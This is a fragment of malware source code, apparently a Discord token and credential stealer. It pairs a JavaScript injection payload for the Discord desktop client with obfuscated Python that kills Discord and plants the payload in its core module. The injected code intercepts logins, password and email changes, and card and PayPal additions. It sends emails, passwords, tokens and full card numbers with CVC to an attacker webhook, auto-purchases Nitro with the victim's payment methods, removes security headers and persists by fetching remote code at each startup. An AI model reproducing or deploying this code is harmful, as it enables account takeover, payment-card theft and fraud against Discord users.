    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def UDCUDCXKRSUFLSYROPWADGBHSXKQDVJCLHRXFSRTVYPCEZYIXVKQDUFSFWFUHDKHB():
    import os
    import re
    import subprocess
    import psutil

    def AWTODVTGRNFIHPJPYUGWNGZAFZESLVGFXFWJKNZCDKVZCLVKKIEYKEMHGVDEXXAPOUJNCXLQAPTSTIVYCJQKTJMT(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY):
        for v4r_file in os.listdir(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY):
            if re.search(r'app-+?', v4r_file):
                CKEBAFRNNBWXYRBBXBIKHROVWZMEOUJOQOWRHPYALRVXBWVVQPMATPTFTXIBTXSJTATIRYVS = VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY + '\\' + v4r_file + '\\modules'
                if not os.path.exists(CKEBAFRNNBWXYRBBXBIKHROVWZMEOUJOQOWRHPYALRVXBWVVQPMATPTFTXIBTXSJTATIRYVS):
                    continue
                for v4r_file in os.listdir(CKEBAFRNNBWXYRBBXBIKHROVWZMEOUJOQOWRHPYALRVXBWVVQPMATPTFTXIBTXSJTATIRYVS):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV = CKEBAFRNNBWXYRBBXBIKHROVWZMEOUJOQOWRHPYALRVXBWVVQPMATPTFTXIBTXSJTATIRYVS + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV, v4r_file
        return None

    def PTXOZGLVEPDFEVWADCJZRKZTAFVRBGBVCIHSUAGFBVSXCHUBJYNBGZATWPKIBCXZTFCFOXHGVZ(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY):
        VTKCWSWJJZJYWUEROEWBGFHXHYDDNGFSJAMLSFACDEFSSWDGANJXPRZWYCAUHLCMW = VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY + '\\Update.exe'
        KEFYOJDRLPRWERGKNTTWVRRFDLWIYFQQPQIOWPBNHGGKYCTIELGKVALRLYCDHCYFYDOCICDBGECYOQFMTNISH = VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY):
            if re.search(r'app-+?', v4r_file):
                HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJS = VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY + '\\' + v4r_file
                if os.path.exists(HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJS + '\\' + 'modules'):
                    for v4r_file in os.listdir(HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJS):
                        if v4r_file == KEFYOJDRLPRWERGKNTTWVRRFDLWIYFQQPQIOWPBNHGGKYCTIELGKVALRLYCDHCYFYDOCICDBGECYOQFMTNISH:
                            KEFYOJDRLPRWERGKNTTWVRRFDLWIYFQQPQIOWPBNHGGKYCTIELGKVALRLYCDHCYFYDOCICDBGECYOQFMTNISH = HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJS + '\\' + KEFYOJDRLPRWERGKNTTWVRRFDLWIYFQQPQIOWPBNHGGKYCTIELGKVALRLYCDHCYFYDOCICDBGECYOQFMTNISH
                            subprocess.call([VTKCWSWJJZJYWUEROEWBGFHXHYDDNGFSJAMLSFACDEFSSWDGANJXPRZWYCAUHLCMW, '--processStart', KEFYOJDRLPRWERGKNTTWVRRFDLWIYFQQPQIOWPBNHGGKYCTIELGKVALRLYCDHCYFYDOCICDBGECYOQFMTNISH],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def RTTHIJZJQGYXHRNXLYMLITPJDSTISUFUMZEUSAGMMNYYKSAXLUHAWHEDKVSJLEJZFWICFUSKZWCOFCVVQMPEIHGOORGILKEQ():
        HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJSdata = os.getenv('LOCALAPPDATA')
        ZUHGIWZWZONMOJWAHZIDQIUXVQGQVGUJJHZNZJOZPVQMVRRLHYAVCPRQEZD = [
            HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJSdata + '\\Discord',
            HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJSdata + '\\DiscordCanary',
            HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJSdata + '\\DiscordPTB',
            HUUIYWNSWSXMHMWKTKCQTPRRYWHEUYSQCWUEHVDASCJYPWETGKKEHLEUJAPWLRNSAFUCHJEHLQOQXHMTHXWCWFWIOEDZJIJSdata + '\\DiscordDevelopment'
        ]
        SHKIIFKRILJCPGVJFMRPQWZQWSLJHCSSEVECGVMRCPESPIDYON = LSUZDQIHROGYOYCMPPFVERKZYARSGDYSTHSQRAJAPMPEQIURSNVISONZVU

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY in ZUHGIWZWZONMOJWAHZIDQIUXVQGQVGUJJHZNZJOZPVQMVRRLHYAVCPRQEZD:
